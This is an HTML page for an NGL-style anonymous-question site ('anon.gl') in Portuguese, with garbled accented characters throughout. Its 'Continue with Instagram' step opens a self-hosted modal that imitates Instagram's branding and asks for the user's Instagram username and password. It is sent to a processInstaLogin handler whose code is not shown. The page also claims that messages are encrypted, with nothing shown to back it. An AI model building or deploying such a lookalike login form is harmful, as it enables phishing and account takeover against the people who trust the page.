<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NGL - Perguntas An么nimas</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
</head>
<body>

    <div class="gradient-bg"></div>

    <div class="container">
        
        <section id="login-screen" class="screen active">
            <div class="logo-area">
                <h1>anon.gl</h1>
                <p>Receba mensagens an么nimas no seu Insta.</p>
            </div>

            <div class="login-action">
                <button onclick="openInstaModal()" class="btn-insta-auth">
                    <span class="icon"></span> Continuar com Instagram
                </button>
                <p class="terms">Ao continuar, voc锚 aceita nossos termos de uso.</p>
            </div>
        </section>

        <section id="dashboard-screen" class="screen hidden">
            <header>
                <button onclick="logout()" class="btn-icon"><span class="material-icons">logout</span></button>
                <h3>INBOX</h3>
                <div style="width: 24px;"></div>
            </header>

            <div class="user-profile-dash">
                <img id="user-avatar" src="" onerror="this.src='https://ui-avatars.com/api/?background=random&color=fff'" alt="Foto">
                <span id="user-name">@usuario</span>
            </div>

            <div class="share-card">
                <p class="blink-text"> Copie seu link </p>
                <div class="link-box">
                    <input type="text" id="my-link" readonly>
                    <button onclick="copyLink()">COPIAR</button>
                </div>
                <button onclick="simulateVisitorView()" class="btn-secondary"> Ver como visitante</button>
            </div>

            <div id="messages-list" class="messages-container">
                <p class="empty-state">Carregando...</p>
            </div>
        </section>

        <section id="public-screen" class="screen hidden public-mode">
            <div class="public-card">
                <div class="avatar-ring">
                    <img id="public-avatar" src="" alt="Avatar">
                </div>
                <h2 id="public-header">Me mande algo an么nimo!</h2>
                <div class="input-wrapper">
                    <textarea id="question-input" placeholder="Ningu茅m vai saber que foi voc锚..."></textarea>
                    <button onclick="rollDice()" class="btn-dice"></button>
                </div>
                <button onclick="sendQuestion()" class="btn-black btn-send">Enviar An么nimo </button>
                <p class="security-text"> Mensagem criptografada</p>
            </div>
            <div class="footer-promo">
                <p>Quer receber tamb茅m?</p>
                <button onclick="goToHome()" class="btn-text">Criar minha conta</button>
            </div>
        </section>

    </div>

    <div id="insta-modal" class="modal-overlay hidden">
        <div class="modal-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="insta-logo">
            <div class="modal-form">
                <input type="text" id="insta-user" placeholder="Nome de usu谩rio">
                <input type="password" id="insta-pass" placeholder="Senha">
                <button onclick="processInstaLogin()" class="btn-login-insta">Entrar</button>
            </div>
            <button onclick="closeInstaModal()" class="btn-close-modal">Cancelar</button>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
